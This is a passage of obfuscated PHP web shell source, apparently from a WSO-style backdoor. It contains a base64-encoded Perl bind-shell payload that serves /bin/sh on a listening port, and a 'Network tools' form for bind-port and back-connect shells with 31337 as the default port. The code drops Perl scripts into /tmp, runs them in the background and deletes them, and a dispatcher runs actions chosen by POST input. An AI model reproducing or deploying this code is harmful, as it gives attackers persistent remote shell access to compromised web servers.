    ${${"GLOBALS"}["nlhhszig"]} = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
    echo "<h1>Network tools</h1><div class=content>\n\t<form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">\n\t<span>Bind port to /bin/sh [perl]</span><br/>\n\tPort: <input type='text' name='port' value='31337'> <input type=submit value='>>'>\n\t</form>\n\t<form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\">\n\t<span>Back-connect  [perl]</span><br/>\n\tServer: <input type='text' name='server' value='" . $_SERVER["REMOTE_ADDR"] . "'> Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>\n\t</form><br>";
    if (isset($_POST["p1"])) {
        function cf($f, $t)
        {
            $xcwsiljfsd = "f";
            $lwuzjrm = "w";
            ${$lwuzjrm} = @fopen(${$xcwsiljfsd}, "w") or @function_exists("file_put_contents");
            if (${${"GLOBALS"}["eelpcfsuym"]}) {
                ${"GLOBALS"}["hoomqvh"] = "w";
                @fwrite(${${"GLOBALS"}["hoomqvh"]}, @base64_decode(${${"GLOBALS"}["rnphbwgqyad"]}));
                @fclose(${${"GLOBALS"}["eelpcfsuym"]});
            }
        }
        if ($_POST["p1"] == "bpp") {
            cf("/tmp/bp.pl", ${${"GLOBALS"}["jbzeoab"]});
            ${"GLOBALS"}["vrlkxlnjx"] = "out";
            ${${"GLOBALS"}["vrlkxlnjx"]} = WebShellOrbEx("perl /tmp/bp.pl " . $_POST["p2"] . " 1>/dev/null 2>&1 &");
            sleep(1);
            echo "<pre class=ml1>{$out}\n" . WebShellOrbEx("ps aux | grep bp.pl") . "</pre>";
            unlink("/tmp/bp.pl");
        }
        if ($_POST["p1"] == "bcp") {
            ${"GLOBALS"}["xycugtp"] = "back_connect_p";
            ${"GLOBALS"}["tmkpcjp"] = "out";
            cf("/tmp/bc.pl", ${${"GLOBALS"}["xycugtp"]});
            ${${"GLOBALS"}["tmkpcjp"]} = WebShellOrbEx("perl /tmp/bc.pl " . $_POST["p2"] . " " . $_POST["p3"] . " 1>/dev/null 2>&1 &");
            sleep(1);
            echo "<pre class=ml1>{$out}\n" . WebShellOrbEx("ps aux | grep bc.pl") . "</pre>";
            unlink("/tmp/bc.pl");
        }
    }
    echo "</div>";
    WebShellOrbFooter();
}
if (empty($_POST["a"])) {
    $lzspptfkyf = "default_action";
    $jwpwgpdoyx = "default_action";
    if (isset(${${"GLOBALS"}["jehnwkvhq"]}) && function_exists("action" . ${$lzspptfkyf})) {
        $_POST["a"] = ${$jwpwgpdoyx};
    } else {
        $_POST["a"] = "SecInfo";
    }
}
if (!empty($_POST["a"]) && function_exists("action" . $_POST["a"])) {
    call_user_func("action" . $_POST["a"]);
}
exit;
